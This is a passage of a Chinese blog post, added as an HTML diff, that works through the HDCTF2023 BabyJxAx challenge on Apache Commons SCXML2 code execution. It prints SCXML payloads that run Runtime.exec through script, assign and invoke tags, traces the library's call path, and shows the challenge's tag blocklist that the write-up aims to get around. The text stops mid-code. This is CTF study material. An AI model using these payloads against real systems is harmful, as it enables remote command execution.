@@ -1,0 +1,846 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Web, Security, Web安全, Java, Java安全">
+    <meta name="description" content="记录一下我的网安学习">
+    <meta name="author" content="1diot9">
+    
+    <title>
+        
+            HDCTF2023-BabyJxAx |
+        
+        1diot9&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/baka.png">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#CCCCCC","title":"1diot9's Blog","author":"1diot9","avatar":"/images/baka.png","logo":"/images/baka.png","favicon":"/images/baka.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"登上山顶的人沉默不语，半途而废者诉说着旅途的艰辛","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://www.github.com/1diot9","weixin":"img | /images/weixin.jpg","qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null},"img_align":"center"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2025,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/baka.png">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               1diot9&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                分类
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        HDCTF2023-BabyJxAx
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/baka.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">1diot9</span>
+                                
+                                    <span class="author-badge">Lv4</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-11-18 12:40:51</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Tue Nov 18 2025 12:41:57 GMT+0800">2025-11-18 12:41:57</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/CTF-Java/">CTF-Java</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/CTF-Java/">CTF-Java</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>1.9k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>9 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <p>[<a class="link"   target="_blank" rel="noopener" href="https://boogipop.com/2023/04/24/Apache%20SCXML2%20RCE%E5%88%86%E6%9E%90/#%E6%80%9D%E8%80%83%E5%85%B6%E4%BB%96payload]" >https://boogipop.com/2023/04/24/Apache%20SCXML2%20RCE%E5%88%86%E6%9E%90/#%E6%80%9D%E8%80%83%E5%85%B6%E4%BB%96payload]<i class="fas fa-external-link-alt"></i></a>(<a class="link"   target="_blank" rel="noopener" href="https://boogipop.com/2023/04/24/Apache" >https://boogipop.com/2023/04/24/Apache<i class="fas fa-external-link-alt"></i></a> SCXML2 RCE分析&#x2F;#思考其他payload)</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://zer0peach.github.io/2024/03/22/Apache-SCXML2-RCE/" >https://zer0peach.github.io/2024/03/22/Apache-SCXML2-RCE/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/" >https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>主要考察scxml2 rce 挖掘。在原有的payload上，挖掘新的利用。</p>
+<h1 id="原payload深入分析"><a href="#原payload深入分析" class="headerlink" title="原payload深入分析"></a>原payload深入分析</h1><p><a class="link"   target="_blank" rel="noopener" href="https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/" >https://pyn3rd.github.io/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/<i class="fas fa-external-link-alt"></i></a></p>
+<p>这篇文章给出了一种利用方式</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.SCXMLExecutor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.io.SCXMLReader;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.model.ModelException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.model.SCXML;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.stream.XMLStreamException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SCXMLDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ModelException, XMLStreamException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// engine to execute the scxml instance</span></span><br><span class="line">        <span class="type">SCXMLExecutor</span> <span class="variable">executor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SCXMLExecutor</span>();</span><br><span class="line">        <span class="comment">// parse SCXML URL into SCXML model</span></span><br><span class="line">        <span class="type">SCXML</span> <span class="variable">scxml</span> <span class="operator">=</span> SCXMLReader.read(<span class="string">&quot;http://127.0.0.1:8000/poc.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// set state machine (scxml instance) to execute</span></span><br><span class="line">        executor.setStateMachine(scxml);</span><br><span class="line">        executor.go();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span><br><span class="line">&lt;scxml xmlns=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> version=<span class="string">&quot;1.0&quot;</span> initial=<span class="string">&quot;run&quot;</span>&gt;</span><br><span class="line">&lt;state id=<span class="string">&quot;run&quot;</span>&gt;</span><br><span class="line">&lt;onentry&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.getClass().forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getRuntime().exec(<span class="string">&#x27;open -a calculator&#x27;</span>)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/onentry&gt;</span><br><span class="line">&lt;/state&gt;</span><br><span class="line">&lt;/scxml&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们打断点，进去调试一下。</p>
+<p>先在Runtime.exec处断点：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763434703748-887d52fc-2ac9-41dd-a614-7e2e6e22ad10.png"  alt="img"></p>
+<p>这些是比较重要的调用栈。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763434812830-d7113769-c998-41dc-bfa9-5d3240e01d48.png"  alt="img"></p>
+<p>可以看到Script.execute就是表达式执行的点。看前一个调用栈：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763434872375-45eaaf76-3714-4b69-8396-3f16ae88059a.png"  alt="img"></p>
+<p>是通过action.execute调用的。那么action肯定是一个接口，我们看看其execute方法的实现：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763434994712-796b5dc9-07ea-4697-b6c4-1074735c49c1.png"  alt="img"></p>
+<p>Script也在其中，所以这些类都有可能是目标。我们点进Assign看看：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763435083626-346715dd-9191-4389-8235-13d6d81188a6.png"  alt="img"></p>
+<p>关键在于有没有Evaluator类执行eval，以及eval的第二个参数是什么。记住这句话。</p>
+<p>现在回去看xml解析的过程，在这里打断点：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763435257741-d8a81aef-a930-41d2-9632-11e061653d00.png"  alt="img"></p>
+<p>前面调用栈最主要的就是通过url获取了xml内容，其他略过。跟进这个readSCML方法，来到：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763435368653-84b96379-4d08-495c-8786-64c8067886f4.png"  alt="img"></p>
+<p>这里很明显，开始一层层往里面读了。跟进readState：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763435710426-bf40c2a5-53be-4941-940c-e39b509e6f5a.png"  alt="img"></p>
+<p>跟进readOnEntry：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763435765296-b1cd14e6-1ad7-4784-bedd-42bbf52c3c6c.png"  alt="img"></p>
+<p>这个readExeutableContext是重点，要准备读取可执行表达式了，跟进：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763435826936-2728c008-2ebb-4c13-b225-1eb1104863e9.png"  alt="img"></p>
+<p>跟进readScript：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763435871007-cecc5737-a1c9-498c-a757-b8a118fe8768.png"  alt="img"></p>
+<p>这里就构建好了最终的Script。</p>
+<p>那上一个switch要是进assign呢？看看：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763435995325-21155f91-02ee-4c56-aa26-2a4ae8081ce2.png"  alt="img"></p>
+<p>这里setExpr就是设置表达式，readAV和参数中的attrLocalName就告诉你要设置在标签的属性中，readRequiredAV就是这个属性一定要设置。</p>
+<p>再回头看看Assign类：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763436082940-a972ad96-dd18-48e5-bb4f-68e7836f56aa.png"  alt="img"></p>
+<p>果然是执行expr。</p>
+<p>所以我们将payload改成：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">initial</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">state</span> <span class="attr">id</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">onentry</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">assign</span> <span class="attr">location</span>=<span class="string">&quot;1&quot;</span> <span class="attr">expr</span>=<span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>&gt;</span></span><br><span class="line">                </span><br><span class="line">            <span class="tag">&lt;/<span class="name">assign</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">onentry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>尝试后也能执行。</p>
+<p>那么在最后一个switch中，其他方法也是类似。</p>
+<p>那么，倒数第二个switch呢？也就是state标签后，一定要是onentry吗？</p>
+<p>当然不是了，下面的payload也可以：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">initial</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">state</span> <span class="attr">id</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">invoke</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">content</span> <span class="attr">expr</span>=<span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;/<span class="name">content</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">invoke</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763436532453-e5f4ff15-5f24-4315-b3a3-5f26cc7dc462.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763436550039-62fe7024-46d4-436d-94d4-4e13088f2924.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763436600759-d923d311-5235-44bb-a0ab-a45e8e45ae28.png"  alt="img"></p>
+<p>那第一层是否为state呢？当然也可以是别的，这个就不细说了，自己看源码应该能懂。</p>
+<p>但是，上面那个invoke的payload，其最终执行的调用栈和前面的并不一样：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763436800239-62b5c32f-c290-464c-afd3-985028df68a3.png"  alt="img"></p>
+<p>一般走的都是最上面的microStep，但其实下面两个也能走。分别是通过invoke和final标签执行的时候。</p>
+<p>其实firstStep最上面还有一个executeGlobalSrcipt，听名字就知道，是执行最外层的script。</p>
+<p>回readSCXML，也能发现readGlobalScript方法：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763437378541-45a2b3dc-7ec3-4578-8b79-484dfd3c35c4.png"  alt="img"></p>
+<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>源码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.babyjxvx.FlagController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilder;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.ParserConfigurationException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.SCXMLExecutor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.io.SCXMLReader;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.model.SCXML;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.xml.BeanDefinitionParserDelegate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Document;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.SAXException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="comment">/* loaded from: BabyJxVx.jar:BOOT-INF/classes/com/example/babyjxvx/FlagController/Flagcontroller.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Flagcontroller</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Boolean <span class="title function_">check</span><span class="params">(String fileName)</span> <span class="keyword">throws</span> IOException, ParserConfigurationException, SAXException &#123;</span><br><span class="line">        <span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">        <span class="type">DocumentBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line">        <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.parse(fileName);</span><br><span class="line">        <span class="type">int</span> <span class="variable">node1</span> <span class="operator">=</span> doc.getElementsByTagName(<span class="string">&quot;script&quot;</span>).getLength();</span><br><span class="line">        <span class="type">int</span> <span class="variable">node2</span> <span class="operator">=</span> doc.getElementsByTagName(<span class="string">&quot;datamodel&quot;</span>).getLength();</span><br><span class="line">        <span class="type">int</span> <span class="variable">node3</span> <span class="operator">=</span> doc.getElementsByTagName(<span class="string">&quot;invoke&quot;</span>).getLength();</span><br><span class="line">        <span class="type">int</span> <span class="variable">node4</span> <span class="operator">=</span> doc.getElementsByTagName(<span class="string">&quot;param&quot;</span>).getLength();</span><br><span class="line">        <span class="type">int</span> <span class="variable">node5</span> <span class="operator">=</span> doc.getElementsByTagName(<span class="string">&quot;parallel&quot;</span>).getLength();</span><br><span class="line">        <span class="type">int</span> <span class="variable">node6</span> <span class="operator">=</span> doc.getElementsByTagName(<span class="string">&quot;history&quot;</span>).getLength();</span><br><span class="line">        <span class="type">int</span> <span class="variable">node7</span> <span class="operator">=</span> doc.getElementsByTagName(<span class="string">&quot;transition&quot;</span>).getLength();</span><br><span class="line">        <span class="type">int</span> <span class="variable">node8</span> <span class="operator">=</span> doc.getElementsByTagName(<span class="string">&quot;state&quot;</span>).getLength();</span><br><span class="line">        <span class="type">int</span> <span class="variable">node9</span> <span class="operator">=</span> doc.getElementsByTagName(<span class="string">&quot;onentry&quot;</span>).getLength();</span><br><span class="line">        <span class="type">int</span> <span class="variable">node10</span> <span class="operator">=</span> doc.getElementsByTagName(<span class="string">&quot;if&quot;</span>).getLength();</span><br><span class="line">        <span class="type">int</span> <span class="variable">node11</span> <span class="operator">=</span> doc.getElementsByTagName(<span class="string">&quot;elseif&quot;</span>).getLength();</span><br><span class="line">        <span class="keyword">if</span> (node1 &gt; <span class="number">0</span> || node2 &gt; <span class="number">0</span> || node3 &gt; <span class="number">0</span> || node4 &gt; <span class="number">0</span> || node5 &gt; <span class="number">0</span> || node6 &gt; <span class="number">0</span> || node7 &gt; <span class="number">0</span> || node8 &gt; <span class="number">0</span> || node9 &gt; <span class="number">0</span> || node10 &gt; <span class="number">0</span> || node11 &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> BeanDefinitionParserDelegate.INDEX_ATTRIBUTE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/Flag&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Flag</span><span class="params">(<span class="meta">@RequestParam(required = true)</span> String filename)</span> &#123;</span><br><span class="line">        <span class="type">SCXMLExecutor</span> <span class="variable">executor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SCXMLExecutor</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (check(filename).booleanValue()) &#123;</span><br><span class="line">                <span class="type">SCXML</span> <span class="variable">scxml</span> <span class="operator">=</span> SCXMLReader.read(filename);</span><br><span class="line">                executor.setStateMachine(scxml);</span><br><span class="line">                executor.go();</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Revenge to me!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;nonono&quot;</span>);</span><br><span 